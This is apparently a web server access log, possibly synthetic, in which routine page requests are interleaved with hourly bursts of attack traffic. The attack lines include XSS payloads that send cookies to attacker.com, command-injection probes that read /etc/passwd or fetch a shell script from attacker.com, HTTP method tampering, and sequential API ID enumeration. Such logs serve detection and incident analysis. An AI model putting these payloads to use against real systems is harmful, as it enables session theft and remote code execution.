195.23.11.8 - - [01/Jun/2025:19:24:34 +0000] "POST /static/js/app.js HTTP/1.1" 304 3023 "-" "curl/7.68.0"
188.37.240.1 - - [01/Jun/2025:19:25:03 +0000] "GET /contact HTTP/1.1" 200 12345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
188.37.240.1 - - [01/Jun/2025:19:33:14 +0000] "GET / HTTP/1.1" 200 11861 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:19:37:36 +0000] "GET /index.html HTTP/1.1" 304 1723 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:19:49:41 +0000] "POST /about HTTP/1.1" 200 6259 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:19:55:52 +0000] "GET /blog/post-1 HTTP/1.1" 404 6598 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:19:58:06 +0000] "GET /blog/post-1 HTTP/1.1" 200 12786 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2.80.17.99 - - [01/Jun/2025:19:58:44 +0000] "GET /index.html HTTP/1.1" 200 10966 "-" "python-requests/2.28.0"
2.80.17.99 - - [01/Jun/2025:19:59:42 +0000] "GET /favicon.ico HTTP/1.1" 200 11214 "-" "python-requests/2.28.0"
198.235.24.130 - - [01/Jun/2025:20:00:00 +0000] "GET /profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1" 200 994 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:00 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 200 1567 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:14 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 200 775 "-" "curl/7.68.0"
198.235.24.130 - - [01/Jun/2025:20:00:18 +0000] "GET /comment?text=<img+src=x+onerror=alert(document.cookie)> HTTP/1.1" 500 1372 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:20 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 500 1757 "-" "curl/7.68.0"
198.235.24.130 - - [01/Jun/2025:20:00:52 +0000] "GET /page?id=javascript:alert(1) HTTP/1.1" 200 981 "-" "curl/7.68.0"
198.235.24.130 - - [01/Jun/2025:20:01:03 +0000] "GET /search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script> HTTP/1.1" 200 165 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:01:12 +0000] "GET /search?q=test|id HTTP/1.1" 500 1094 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:20:01:26 +0000] "GET /static/js/app.js HTTP/1.1" 404 9555 "-" "Wget/1.21"
2.80.17.99 - - [01/Jun/2025:20:07:28 +0000] "POST /robots.txt HTTP/1.1" 200 7927 "-" "Mozilla/5.0 (X11; Linux x86_64)"
2.80.17.99 - - [01/Jun/2025:20:08:33 +0000] "POST /sitemap.xml HTTP/1.1" 200 12862 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:20:11:37 +0000] "GET /about HTTP/1.1" 200 5836 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:20:11:43 +0000] "GET /static/css/main.css HTTP/1.1" 200 13864 "-" "Wget/1.21"
195.23.11.8 - - [01/Jun/2025:20:12:41 +0000] "GET /about HTTP/1.1" 200 11950 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:20:17:47 +0000] "GET /products HTTP/1.1" 200 7967 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:20:17:59 +0000] "GET /robots.txt HTTP/1.1" 404 9233 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:20:25:11 +0000] "GET /sitemap.xml HTTP/1.1" 200 3409 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:20:33:27 +0000] "GET /products/1 HTTP/1.1" 200 11133 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:20:34:07 +0000] "POST /robots.txt HTTP/1.1" 200 5415 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:20:41:36 +0000] "POST /contact HTTP/1.1" 200 6065 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:20:42:07 +0000] "GET /products/1 HTTP/1.1" 200 10483 "-" "python-requests/2.28.0"
188.37.240.1 - - [01/Jun/2025:20:47:36 +0000] "GET /sitemap.xml HTTP/1.1" 200 3728 "-" "curl/7.68.0"
89.207.132.170 - - [01/Jun/2025:21:00:00 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 176 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:00 +0000] "GET /search?q=test|id HTTP/1.1" 500 766 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:00 +0000] "CONNECT /login HTTP/1.1" 200 447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:14 +0000] "PUT /users/1 HTTP/1.1" 405 711 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:18 +0000] "DELETE /config HTTP/1.1" 405 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:00:19 +0000] "GET /page?id=javascript:alert(1) HTTP/1.1" 200 1116 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:22 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 500 662 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:38 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 500 1122 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:42 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 500 1328 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:48 +0000] "DELETE /admin HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:01:00 +0000] "GET /search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script> HTTP/1.1" 500 614 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:01:00 +0000] "TRACE /admin HTTP/1.1" 403 578 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:01:05 +0000] "PUT /static/app.js HTTP/1.1" 200 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:01:40 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 500 716 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:21:08:31 +0000] "GET /favicon.ico HTTP/1.1" 200 6841 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:21:10:10 +0000] "GET /static/js/app.js HTTP/1.1" 304 9079 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:21:17:19 +0000] "GET /about HTTP/1.1" 304 423 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:21:23:25 +0000] "GET /products/1 HTTP/1.1" 200 10085 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2.80.17.99 - - [01/Jun/2025:21:23:59 +0000] "GET /static/js/app.js HTTP/1.1" 200 4308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:21:29:05 +0000] "GET /static/js/app.js HTTP/1.1" 304 7021 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:21:31:32 +0000] "GET /products/1 HTTP/1.1" 200 12602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.152.3.77 - - [01/Jun/2025:21:37:44 +0000] "POST /blog HTTP/1.1" 200 1096 "-" "Wget/1.21"
2.80.17.99 - - [01/Jun/2025:21:46:29 +0000] "GET / HTTP/1.1" 304 4685 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:21:52:51 +0000] "GET /robots.txt HTTP/1.1" 200 9224 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:21:55:31 +0000] "POST /sitemap.xml HTTP/1.1" 200 1275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:21:56:36 +0000] "GET /static/css/main.css HTTP/1.1" 200 2238 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:21:57:21 +0000] "POST /products HTTP/1.1" 200 14978 "-" "python-requests/2.28.0"
194.147.78.155 - - [01/Jun/2025:22:00:00 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 200 499 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:00:00 +0000] "TRACK / HTTP/1.1" 403 986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 186 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:03 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 190 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:04 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 198 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:04 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 186 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:08 +0000] "PUT /static/app.js HTTP/1.1" 200 155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
194.147.78.155 - - [01/Jun/2025:22:00:16 +0000] "GET /search?q=test|id HTTP/1.1" 200 162 "-" "curl/7.68.0"
77.81.142.9 - - [01/Jun/2025:22:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 182 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:18 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 148 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:20 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 197 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:20 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 188 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:24 +0000] "DELETE /users/1 HTTP/1.1" 200 417 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:28 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 193 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:30 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 156 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:32 +0000] "TRACE /admin HTTP/1.1" 200 594 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:00:45 +0000] "DELETE /config HTTP/1.1" 403 470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:00:48 +0000] "CONNECT /login HTTP/1.1" 403 817 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
194.147.78.155 - - [01/Jun/2025:22:00:54 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 500 727 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:01:48 +0000] "TRACE /index.html HTTP/1.1" 403 135 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:01:59 +0000] "PUT /users/1 HTTP/1.1" 403 587 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:02:32 +0000] "DELETE /admin HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
188.37.240.1 - - [01/Jun/2025:22:04:22 +0000] "POST /favicon.ico HTTP/1.1" 404 11606 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
188.37.240.1 - - [01/Jun/2025:22:12:57 +0000] "GET /blog HTTP/1.1" 200 9773 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:22:16:41 +0000] "GET /blog HTTP/1.1" 200 11073 "-" "Wget/1.21"
195.23.11.8 - - [01/Jun/2025:22:18:23 +0000] "GET / HTTP/1.1" 200 13599 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.152.3.77 - - [01/Jun/2025:22:23:42 +0000] "POST /robots.txt HTTP/1.1" 404 4016 "-" "python-requests/2.28.0"
195.23.11.8 - - [01/Jun/2025:22:28:56 +0000] "POST /products/1 HTTP/1.1" 200 10321 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:22:36:40 +0000] "POST /static/css/main.css HTTP/1.1" 200 9770 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:22:37:22 +0000] "GET /blog HTTP/1.1" 200 7757 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:22:46:01 +0000] "POST /static/css/main.css HTTP/1.1" 304 2218 "-" "Mozilla/5.0 (X11; Linux x86_64)"
195.23.11.8 - - [01/Jun/2025:22:56:48 +0000] "POST /index.html HTTP/1.1" 200 7687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.108.56.181 - - [01/Jun/2025:23:00:00 +0000] "DELETE /users/1 HTTP/1.1" 200 846 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 156 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:03 +0000] "GET /api/projects/1 HTTP/1.1" 404 43 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:04 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 156 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:04 +0000] "GET /api/projects/2 HTTP/1.1" 404 125 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:23:00:06 +0000] "GET /blog/post-1 HTTP/1.1" 200 2160 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:06 +0000] "GET /api/projects/3 HTTP/1.1" 404 66 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:07 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 167 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:08 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 132 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:08 +0000] "GET /api/projects/4 HTTP/1.1" 404 100 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:08 +0000] "GET /api/projects/8 HTTP/1.1" 404 111 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 145 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:10 +0000] "GET /api/projects/5 HTTP/1.1" 404 89 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:10 +0000] "GET /api/projects/10 HTTP/1.1" 404 138 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:11 +0000] "GET /api/projects/11 HTTP/1.1" 404 149 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:12 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 136 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:12 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 133 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:12 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 134 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:12 +0000] "GET /api/projects/6 HTTP/1.1" 404 0 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:12 +0000] "GET /api/projects/12 HTTP/1.1" 404 24 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:14 +0000] "GET /api/projects/7 HTTP/1.1" 404 103 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:14 +0000] "GET /api/projects/14 HTTP/1.1" 404 58 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 160 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:16 +0000] "GET /api/projects/16 HTTP/1.1" 404 34 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:18 +0000] "PUT /users/1 HTTP/1.1" 200 553 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:18 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 174 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:20 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 125 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.108.56.181 - - [01/Jun/2025:23:00:21 +0000] "DELETE /admin HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:27 +0000] "GET /api/projects/9 HTTP/1.1" 404 59 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:30 +0000] "DELETE /config HTTP/1.1" 403 622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:30 +0000] "GET /api/projects/15 HTTP/1.1" 404 26 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:36 +0000] "TRACE /index.html HTTP/1.1" 200 453 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:39 +0000] "GET /api/projects/13 HTTP/1.1" 404 87 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:40 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 95 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:44 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 167 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.108.56.181 - - [01/Jun/2025:23:00:48 +0000] "PATCH /dashboard HTTP/1.1" 403 110 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:56 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 180 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:01:05 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 111 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.108.56.181 - - [01/Jun/2025:23:01:25 +0000] "PUT /static/app.js HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2.80.17.99 - - [01/Jun/2025:23:05:05 +0000] "GET /products HTTP/1.1" 304 3884 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:23:09:04 +0000] "GET /products/1 HTTP/1.1" 404 1412 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:23:11:02 +0000] "GET /blog/post-1 HTTP/1.1" 200 9585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:23:14:23 +0000] "GET /products/1 HTTP/1.1" 200 13862 "-" "Wget/1.21"
188.37.240.1 - - [01/Jun/2025:23:41:41 +0000] "GET /products/1 HTTP/1.1" 200 5312 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:23:43:00 +0000] "GET /sitemap.xml HTTP/1.1" 200 7445 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 103 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:00 +0000] "POST /api/auth/register HTTP/1.1" 400 181 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:01 +0000] "GET /api/tasks/1 HTTP/1.1" 404 65 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:01 +0000] "POST /api/auth/register HTTP/1.1" 400 104 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:02 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 99 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:02 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 151 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:03 +0000] "POST /api/auth/register HTTP/1.1" 409 129 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:04 +0000] "GET /api/tasks/2 HTTP/1.1" 404 146 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:04 +0000] "GET /api/tasks/4 HTTP/1.1" 404 119 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:04 +0000] "POST /api/auth/register HTTP/1.1" 409 166 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:04 +0000] "POST /api/auth/register HTTP/1.1" 400 174 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:09 +0000] "GET /api/tasks/3 HTTP/1.1" 404 83 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:10 +0000] "POST /api/auth/register HTTP/1.1" 409 122 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:14 +0000] "GET /api/tasks/14 HTTP/1.1" 404 146 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:14 +0000] "POST /api/auth/register HTTP/1.1" 400 135 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 120 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 185 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:15 +0000] "GET /api/tasks/5 HTTP/1.1" 404 101 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:15 +0000] "GET /api/tasks/15 HTTP/1.1" 404 64 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 113 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:16 +0000] "GET /api/tasks/8 HTTP/1.1" 404 141 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:16 +0000] "POST /api/auth/register HTTP/1.1" 409 109 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:17 +0000] "POST /api/auth/register HTTP/1.1" 409 130 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:18 +0000] "GET /api/tasks/6 HTTP/1.1" 404 105 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:19 +0000] "GET /api/tasks/19 HTTP/1.1" 404 103 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:20 +0000] "POST /api/auth/register HTTP/1.1" 409 98 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:21 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 140 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:21 +0000] "GET /api/tasks/7 HTTP/1.1" 404 108 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:22 +0000] "GET /api/tasks/11 HTTP/1.1" 404 87 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:24 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 147 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:24 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 85 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:24 +0000] "POST /api/auth/register HTTP/1.1" 409 196 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:26 +0000] "GET /api/tasks/13 HTTP/1.1" 404 122 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:27 +0000] "GET /api/tasks/9 HTTP/1.1" 404 122 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:27 +0000] "POST /api/auth/register HTTP/1.1" 400 184 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:28 +0000] "POST /api/auth/register HTTP/1.1" 400 171 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:30 +0000] "GET /api/tasks/10 HTTP/1.1" 404 53 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:30 +0000] "POST /api/auth/register HTTP/1.1" 400 102 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:32 +0000] "GET /api/tasks/16 HTTP/1.1" 404 119 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:32 +0000] "POST /api/auth/register HTTP/1.1" 409 119 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:33 +0000] "POST /api/auth/register HTTP/1.1" 409 191 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:36 +0000] "GET /api/tasks/12 HTTP/1.1" 404 135 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:36 +0000] "POST /api/auth/register HTTP/1.1" 400 98 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:51 +0000] "GET /api/tasks/17 HTTP/1.1" 404 0 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:52 +0000] "POST /api/auth/register HTTP/1.1" 400 187 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:54 +0000] "GET /api/tasks/18 HTTP/1.1" 404 16 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:01:12 +0000] "POST /api/auth/register HTTP/1.1" 409 162 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:00 +0000] "POST /api/auth/register HTTP/1.1" 400 115 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:02 +0000] "GET /api/projects/2 HTTP/1.1" 404 3 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:02 +0000] "POST /api/auth/register HTTP/1.1" 409 114 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:03 +0000] "GET /api/projects/1 HTTP/1.1" 404 9 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:04 +0000] "POST /api/auth/register HTTP/1.1" 400 161 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:04 +0000] "POST /api/auth/register HTTP/1.1" 400 185 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:05 +0000] "GET /api/projects/5 HTTP/1.1" 404 73 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:05 +0000] "POST /api/auth/register HTTP/1.1" 400 146 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:06 +0000] "GET /api/projects/3 HTTP/1.1" 404 92 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:06 +0000] "GET /api/projects/6 HTTP/1.1" 404 137 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:07 +0000] "GET /api/projects/7 HTTP/1.1" 404 124 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:07 +0000] "POST /api/auth/register HTTP/1.1" 400 109 "-" "python-requests/2.28.0"
